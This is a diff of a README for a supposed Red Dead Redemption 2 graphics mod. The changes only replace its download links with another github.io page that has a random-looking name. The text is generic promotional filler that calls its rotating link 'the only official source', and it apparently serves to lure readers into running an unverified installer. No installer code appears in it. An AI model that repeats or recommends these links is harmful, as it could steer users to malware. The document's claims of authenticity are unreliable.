@@ -2,7 +2,7 @@
 
 The Red Dead Redemption 2 Graphics Overhaul is a comprehensive modification tool specifically developed for Windows 10 and Windows 11 users who wish to enhance the visual fidelity of Red Dead Redemption 2 in 2026. This tool provides a seamless way to upgrade textures, lighting, and performance settings, ensuring an immersive gaming experience without compromising stability. Whether you are exploring the vast open world or engaging in intense shootouts, this overhaul brings new life to every detail.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Overview
 
@@ -66,7 +66,7 @@ If you experience issues during installation or gameplay, consider these common 
 
 To get started, download the latest version of the Red Dead Redemption 2 Graphics Overhaul from the official GitHub page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link is the only official source for the tool. Avoid third-party downloads to ensure safety and authenticity.
 
